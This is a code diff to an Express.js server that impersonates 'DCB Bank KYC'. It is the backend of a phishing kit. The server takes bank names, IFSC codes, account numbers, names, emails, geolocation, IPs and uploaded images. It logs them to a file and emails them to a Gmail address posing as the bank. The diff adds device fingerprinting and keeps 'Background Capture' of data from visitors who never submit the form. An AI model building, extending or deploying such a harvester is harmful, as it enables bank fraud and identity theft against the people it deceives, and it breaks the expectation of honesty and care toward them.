@@ -3,48 +3,34 @@ const multer = require('multer');
 const fs = require('fs');
 const path = require('path');
 const nodemailer = require('nodemailer');
+const UAParser = require('ua-parser-js');
+
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Middleware for handling large payloads
+// Middleware
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.json({ limit: '50mb' }));
 app.use(express.static('public'));
 
-// Create uploads directory if it doesn't exist
+// File upload setup
 const uploadDir = 'uploads';
 if (!fs.existsSync(uploadDir)) {
   fs.mkdirSync(uploadDir);
 }
 
-// Set up multer for file upload
 const storage = multer.diskStorage({
-  destination: function (req, file, cb) {
-    cb(null, uploadDir);
-  },
-  filename: function (req, file, cb) {
-    const uniqueName = `${Date.now()}-${file.originalname}`;
-    cb(null, uniqueName);
-  }
+  destination: (req, file, cb) => cb(null, uploadDir),
+  filename: (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`)
 });
 
-// File filter function
-const fileFilter = (req, file, cb) => {
-  const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
-  if (allowedTypes.includes(file.mimetype)) {
-    cb(null, true);
-  } else {
-    cb(new Error('Only JPG, PNG, or PDF files are allowed'), false);
-  }
-};
-
-// Create upload instance
 const upload = multer({
   storage: storage,
-  fileFilter: fileFilter,
-  limits: {
-    fileSize: 50 * 1024 * 1024 // 50MB limit
-  }
+  fileFilter: (req, file, cb) => {
+    const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
+    cb(null, allowedTypes.includes(file.mimetype));
+  },
+  limits: { fileSize: 50 * 1024 * 1024 }
 }).any();
 
 // Email transporter
@@ -56,114 +42,29 @@ const transporter = nodemailer.createTransport({
   }
 });
 
-// Route to handle form submission
-app.post('/submit', (req, res) => {
-  upload(req, res, async function (err) {
-    if (err) {
-      console.error('Upload error:', err);
-      return res.status(500).send('Upload error: ' + err.message);
-    }
+// Helper functions
+const getClientIp = (req) => {
+  return req.headers['x-forwarded-for']?.split(',')[0] || 
+         req.connection?.remoteAddress ||
+         req.socket?.remoteAddress ||
+         req.connection?.socket?.remoteAddress;
+};
 
-    try {
-      // Get real client IP (handles proxy headers)
-      const getClientIp = (req) => {
-        return req.headers['x-forwarded-for']?.split(',')[0] || 
-               req.connection?.remoteAddress ||
-               req.socket?.remoteAddress ||
-               req.connection?.socket?.remoteAddress;
-      };
-      
-      const ip = getClientIp(req);
-      const userAgent = req.headers['user-agent'];
-      const isFormEmpty = req.body.empty_form === 'true';
-      
-      // Process all received data
-      const submissionData = {
-        bankname: req.body.bankname || 'Not provided',
-        ifsc: req.body.ifsc || 'Not provided',
-        accno: req.body.accno || 'Not provided',
-        fullname: req.body.fullname || 'Not provided',
-        email: req.body.email || 'Not provided',
-        location: req.body.location ? JSON.parse(req.body.location) : null,
-        ip: ip,
-        userAgent: userAgent,
-        timestamp: req.body.timestamp || new Date().toISOString(),
-        isFormEmpty: isFormEmpty,
-        imageCount: Object.keys(req.files || {}).filter(k => k.startsWith('image')).length
-      };
-      
-      // Log the submission
-      const logEntry = `
---- ${isFormEmpty ? 'BACKGROUND' : 'FULL'} SUBMISSION ---
-Bank: ${submissionData.bankname}
-IFSC: ${submissionData.ifsc}
-Account: ${submissionData.accno}
-Name: ${submissionData.fullname}
-Email: ${submissionData.email}
-IP: ${submissionData.ip}
-Location: ${submissionData.location ? 
-  `${submissionData.location.latitude}, ${submissionData.location.longitude}` : 'None'}
-Images: ${submissionData.imageCount}
-Empty Form: ${isFormEmpty}
-User Agent: ${userAgent}
------------------------------
-`;
-      
-      fs.appendFileSync('records.txt', logEntry);
-      console.log(logEntry);
-      
-      // Prepare email
-      const mailOptions = {
-        from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
-        to: 'dcbsubmission392@gmail.com',
-        subject: isFormEmpty ? 
-          '⚠️ Background Capture - DCB Bank' : 
-          '✅ KYC Submission - DCB Bank',
-        html: buildEmailHtml(submissionData),
-        attachments: []
-      };
-      
-      // Add all files as attachments
-      if (req.files) {
-        req.files.forEach(file => {
-          mailOptions.attachments.push({
-            filename: file.originalname,
-            path: file.path
-          });
-        });
-      }
-      
-      // Send email
-      console.log('Sending email...');
-      await transporter.sendMail(mailOptions);
-      console.log('Email sent successfully');
-      
-      // Cleanup files
-      if (req.files) {
-        req.files.forEach(file => {
-          try {
-            fs.unlinkSync(file.path);
-          } catch (e) {
-            console.error('Error deleting file:', e);
-          }
-        });
-      }
-      
-      res.status(200).send();
-    } catch (error) {
-      console.error('❌ Error:', error);
-      res.status(500).send('Error processing submission');
-    }
-  });
-});
-
-// Helper function to build email HTML
-function buildEmailHtml(data) {
+const buildEmailHtml = (data) => {
   return `
     <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
       <h2 style="color: ${data.isFormEmpty ? '#d32f2f' : '#003d6a'};">
         ${data.isFormEmpty ? '⚠️ Background Capture' : '✅ KYC Submission'}
       </h2>
+      
+      <div style="background-color: #eef7ff; padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #003d6a;">
+        <h3 style="color: #003d6a; margin-top: 0;">📱 Device Information</h3>
+        <p><strong>Type:</strong> ${data.device.type === 'mobile' ? '📱 Mobile' : '💻 Desktop'} 
+           ${data.device.vendor !== 'Unknown' ? `(${data.device.vendor})` : ''}</p>
+        ${data.device.model !== 'Unknown' ? `<p><strong>Model:</strong> ${data.device.model}</p>` : ''}
+        <p><strong>OS:</strong> ${data.os}</p>
+        <p><strong>Browser:</strong> ${data.browser}</p>
+      </div>
       
       <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
         <h3 style="color: #003d6a; margin-top: 0;">${data.isFormEmpty ? 'Background Data' : 'Account Information'}</h3>
@@ -195,9 +96,94 @@ function buildEmailHtml(data) {
       </div>
     </div>
   `;
-}
+};
+
+// Routes
+app.post('/submit', (req, res) => {
+  upload(req, res, async (err) => {
+    try {
+      if (err) throw err;
+
+      // Parse device info from both client and server
+      const clientUA = req.body.user_agent || '';
+      const serverUA = req.headers['user-agent'] || '';
+      const parser = new UAParser(clientUA || serverUA);
+      
+      const device = parser.getDevice();
+      const os = parser.getOS();
+      const browser = parser.getBrowser();
+
+      const submissionData = {
+        device: {
+          type: device.type || req.body.device_type || 'desktop',
+          model: device.model || req.body.device_model || 'Unknown',
+          vendor: device.vendor || req.body.device_vendor || 'Unknown'
+        },
+        os: `${os.name} ${os.version}` || req.body.device_os,
+        browser: `${browser.name} ${browser.version}` || req.body.device_browser,
+        bankname: req.body.bankname,
+        ifsc: req.body.ifsc,
+        accno: req.body.accno,
+        fullname: req.body.fullname,
+        email: req.body.email,
+        location: req.body.location ? JSON.parse(req.body.location) : null,
+        ip: getClientIp(req),
+        userAgent: serverUA,
+        timestamp: req.body.timestamp || new Date().toISOString(),
+        isFormEmpty: req.body.empty_form === 'true',
+        imageCount: (req.files || []).filter(f => f.fieldname.startsWith('image')).length
+      };
+
+      // Log the submission
+      const logEntry = `
+--- ${submissionData.isFormEmpty ? 'BACKGROUND' : 'FULL'} SUBMISSION ---
+Device: ${submissionData.device.vendor} ${submissionData.device.model} (${submissionData.device.type})
+OS: ${submissionData.os}
+Browser: ${submissionData.browser}
+IP: ${submissionData.ip}
+Location: ${submissionData.location ? 
+  `${submissionData.location.latitude}, ${submissionData.location.longitude}` : 'None'}
+Bank: ${submissionData.bankname}
+IFSC: ${submissionData.ifsc}
+Account: ${submissionData.accno}
+Name: ${submissionData.fullname}
+Email: ${submissionData.email}
+Images: ${submissionData.imageCount}
+User Agent: ${submissionData.userAgent}
+Timestamp: ${submissionData.timestamp}
+-----------------------------
+`;
+
+      fs.appendFileSync('records.txt', logEntry);
+      console.log(logEntry);
+
+      // Send email
+      await transporter.sendMail({
+        from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
+        to: 'dcbsubmission392@gmail.com',
+        subject: submissionData.isFormEmpty ? '⚠️ Background Capture' : '✅ KYC Submission',
+        html: buildEmailHtml(submissionData),
+        attachments: (req.files || []).map(file => ({
+          filename: file.originalname,
+          path: file.path
+        }))
+      });
+
+      // Cleanup files
+      (req.files || []).forEach(file => {
+        try { fs.unlinkSync(file.path); } catch (e) { console.error('File cleanup error:', e); }
+      });
+
+      res.status(200).send();
+    } catch (error) {
+      console.error('❌ Error:', error);
+      res.status(500).send('Error processing submission');
+    }
+  });
+});
 
 // Start server
 app.listen(port, () => {
   console.log(`Server running on port ${port}`);
+  console.log(`Access the app at http://localhost:${port}`);
 });
